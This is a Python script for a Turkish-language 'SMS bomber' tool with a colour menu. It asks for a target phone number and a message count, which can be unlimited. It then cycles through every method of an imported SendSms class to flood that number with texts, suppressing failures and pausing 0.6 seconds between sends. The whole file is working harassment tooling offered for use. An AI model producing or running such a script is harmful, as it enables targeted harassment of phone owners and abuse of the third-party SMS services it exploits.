from colorama import init, Fore, Style
from time import sleep
import os
from os import system
from sms import SendSms
from tqdm import tqdm

init(autoreset=True)

def clear():
    system("cls" if os.name == "nt" else "clear")

def banner():
    clear()
    print(f"""{Fore.CYAN}
╔════════════════════════════════════════════════════════════╗
║                  SMS BOMBER ULTRA v3.1                     ║
║                 Sadece Başarılı Gönderimler                ║
╚════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
    Yapimci : soytariomer.17   |   Instagram : omer17ll
""")

def get_phone():
    banner()
    print(f"{Fore.WHITE}Telefon Numarasi (10 haneli, +90 olmadan):{Style.RESET_ALL}")
    while True:
        num = input(f"{Fore.GREEN}> {Style.RESET_ALL}").strip()
        if len(num) == 10 and num.isdigit():
            return num
        print(f"{Fore.RED}Hata! 10 haneli rakam girin.{Style.RESET_ALL}")

def get_count():
    print(f"{Fore.WHITE}Kac SMS gonderilsin? (Bos = Sonsuz):{Style.RESET_ALL}")
    val = input(f"{Fore.GREEN}> {Style.RESET_ALL}").strip()
    return None if val == "" else int(val)

def main():
    while True:
        banner()
        print(f"{Fore.YELLOW}1. Ultra Mod - Baslat")
        print(f"2. Cikis{Style.RESET_ALL}\n")
        sec = input(f"{Fore.CYAN}Secim > {Style.RESET_ALL}")

        if sec == "2":
            banner()
            print(f"{Fore.RED}Program kapatiliyor...{Style.RESET_ALL}")
            sleep(1.2)
            break
        if sec != "1":
            continue

        phone = get_phone()
        count = get_count()

        banner()
        print(f"{Fore.MAGENTA}Hedef Numara : {phone}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}Hedef SMS    : {'Sonsuz' if not count else count}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}\n")

        sms = SendSms(phone, "")
        sent = 0
        target = count if count else float('inf')

        with tqdm(total=target if count else None, desc="ULTRA GONDERIM", unit=" SMS", 
                  bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}  {elapsed}") as pbar:

            while sent < target:
                for method in [m for m in dir(SendSms) if callable(getattr(SendSms, m)) and not m.startswith("__")]:
                    if sent >= target:
                        break
                    try:
                        if getattr(sms, method)():
                            sent += 1
                            pbar.update(1)
                            print(f"{Fore.LIGHTGREEN_EX}GONDERILDI → {method}{Style.RESET_ALL}")
                    except:
                        pass   # Basarisiz hic gorunmez
                    sleep(0.6)   # Ultra hiz icin dusuk bekleme

        banner()
        print(f"{Fore.LIGHTGREEN_EX}ISLEM TAMAMLANDI{Style.RESET_ALL}")
        print(f"Toplam Basarili Gonderim : {sent}")
        input(f"\n{Fore.YELLOW}Menuye donmek icin Enter...{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
